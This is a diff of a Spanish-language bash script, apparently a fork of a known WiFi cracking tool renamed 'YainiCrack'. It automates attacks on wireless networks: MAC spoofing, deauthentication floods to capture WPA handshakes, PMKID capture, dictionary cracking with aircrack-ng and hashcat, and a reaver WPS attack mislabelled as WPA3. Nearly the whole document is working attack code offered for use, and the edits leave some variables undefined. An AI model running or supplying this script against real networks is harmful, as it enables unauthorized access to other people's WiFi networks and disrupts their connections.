@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # Author: s4vitar - nmap y pa' dentro
-# Mejorado por Papote-M139 - Name version: YainiCrack -  actualizacion 2024
 
 # Colores
 greenColour="\e[0;32m\033[1m"
@@ -16,11 +15,12 @@ grayColour="\e[0;37m\033[1m"
 # ASCII Art
 asciiArt() {
     echo -e "${skyBlueColour}"
-    echo "              _         _    ___                     _    "
-    echo " /\_/\  __ _ (_) _ __  (_)  / __\ _ __   __ _   ___ | | __"
-    echo " \_ _/ / _\` || || '_ \\ | | / /   | '__| / _\` | / __|| |/ /"
-    echo "  / \\ | (_| || || | | || |/ /___ | |   | (_| || (__ |   < "
-    echo "  \\_/  \\__,_||_||_| |_||_|\\____/ |_|    \\__,_| \\___||_|\\_\\"
+    echo " __   __        _         _  _____                     _    "
+    echo " \ \ / /       (_)       (_)/  __ \                   | |   "
+    echo "  \ V /   __ _  _  _ __   _ | /  \/ _ __   __ _   ___ | | __"
+    echo "   \ /   / _\` || || '_ \\ | || |    | '__| / _\` | / __|| |/ /"
+    echo "   | |  | (_| || || | | || || \\__/| |   | (_| || (__ |   < "
+    echo "   \\_/   \\__,_||_||_| |_||_| \\____/|_|    \\__,_| \\___||_|\\_\\"
     echo -e "${endColour}"
 }
 
@@ -30,13 +30,14 @@ trap ctrl_c INT
 
 function ctrl_c() {
     echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo${endColour}"
-    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
+    tput cnorm
+    airmon-ng stop ${networkCard}mon > /dev/null 2>&1
     rm Captura* 2>/dev/null
     exit 0
 }
 
 function helpPanel() {
-    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./s4viPwnWifi.sh${endColour}"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./YainiCrack.sh${endColour}"
     echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
     echo -e "\t\t${redColour}Handshake${endColour}"
     echo -e "\t\t${redColour}PKMID${endColour}"
@@ -48,7 +49,8 @@ function helpPanel() {
 
 function dependencies() {
     tput civis
-    clear; dependencies=(aircrack-ng macchanger hcxdumptool hashcat reaver)
+    clear
+    dependencies=(aircrack-ng macchanger hcxdumptool hashcat reaver xterm)
 
     echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
     sleep 2
@@ -56,85 +58,83 @@ function dependencies() {
     for program in "${dependencies[@]}"; do
         echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"
 
-        if ! command -v $program &> /dev/null; then
+        if command -v $program &> /dev/null; then
+            echo -e " ${greenColour}(V)${endColour}"
+        else
             echo -e " ${redColour}(X)${endColour}\n"
             echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
             apt-get install $program -y > /dev/null 2>&1
-        else
-            echo -e " ${greenColour}(V)${endColour}"
         fi
         sleep 1
     done
 }
 
-function selectNetworkCard() {
-    echo -e "${yellowColour}[*]${endColour}${grayColour} Seleccionando tarjeta de red...${endColour}"
-    # Lógica para seleccionar la tarjeta de red más adecuada
-    networkCard=$(ip link show | grep -E '^[0-9]+: ' | awk -F ': ' '{print $2}' | head -n 1)
-    echo -e "${yellowColour}[*]${endColour}${grayColour} Tarjeta de red seleccionada: ${endColour}${purpleColour}$networkCard${endColour}"
-}
-
 function startAttack() {
     clear
-    asciiArt
     echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
     airmon-ng start $networkCard > /dev/null 2>&1
-    ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
-    ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
+    if [ $? -ne 0 ]; then
+        echo -e "${redColour}[!] Error al iniciar airmon-ng en $networkCard${endColour}"
+        exit 1
+    fi
 
-    echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
+    ifconfig ${networkCard}mon down
+    macchanger -a ${networkCard}mon > /dev/null 2>&1
+    ifconfig ${networkCard}mon up
+    killall dhclient wpa_supplicant 2>/dev/null
 
-    if [ "$(echo $attack_mode)" == "Handshake" ]; then
-        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque Handshake...${endColour}"
-        sleep 2
+    new_mac=$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')
+    echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$new_mac${endColour}${purpleColour}]${endColour}"
+
+    if [ "$attack_mode" == "Handshake" ]; then
+        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque Handshake.${endColour}"
         xterm -hold -e "airodump-ng ${networkCard}mon" &
         airodump_xterm_PID=$!
         echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
         echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
 
-        kill -9 $airodump_xterm_PID
+        kill -9 $airodump_xterm_PID 2>/dev/null
         wait $airodump_xterm_PID 2>/dev/null
 
         xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
         airodump_filter_xterm_PID=$!
 
-        sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
+        sleep 5
+        xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
         aireplay_xterm_PID=$!
-        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+        sleep 10
+        kill -9 $aireplay_xterm_PID 2>/dev/null
+        wait $aireplay_xterm_PID 2>/dev/null
 
-        sleep 10; kill -9 $airodump_filter_xterm_PID
+        sleep 10
+        kill -9 $airodump_filter_xterm_PID 2>/dev/null
         wait $airodump_filter_xterm_PID 2>/dev/null
 
         xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
-    elif [ "$(echo $attack_mode)" == "PKMID" ]; then
-        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID...${endColour}\n"
-        sleep 2
+    elif [ "$attack_mode" == "PKMID" ]; then
+        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID.${endColour}"
         timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
         echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
-        sleep 2
-        hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+        hcxpcaptool -z myHashes Captura
+        rm Captura 2>/dev/null
 
-        test -f myHashes
-
-        if [ "$(echo $?)" == "0" ]; then
+        if [ -f myHashes ]; then
             echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
-            sleep 2
-
             hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
         else
-            echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
+            echo -e "\n${redColour}[!] No se ha podido capturar el paquete necesario...${endColour}\n"
             rm Captura* 2>/dev/null
             sleep 2
         fi
-    elif [ "$(echo $attack_mode)" == "WPA3" ]; then
-        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque WPA3...${endColour}\n"
-        # Lógica para ataque WPA3 aquí
+    elif [ "$attack_mode" == "WPA3" ]; then
+        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque WPA3.${endColour}"
+        reaver -i ${networkCard}mon -b $bssid -K 1 -vv
     else
         echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
     fi
 }
 
-# Función Principal
+# Main Function
 
 if [ "$(id -u)" == "0" ]; then
     asciiArt
@@ -151,10 +151,10 @@ if [ "$(id -u)" == "0" ]; then
         helpPanel
     else
         dependencies
-        selectNetworkCard
         startAttack
         tput cnorm
     fi
 else
-    echo -e "\n${redColour}[*] Necesitas ser root para ejecutar este script${endColour}\n"
+    echo -e "\n${redColour}[!] Debes ser root para ejecutar este script${endColour}\n"
+    exit 1
 fi
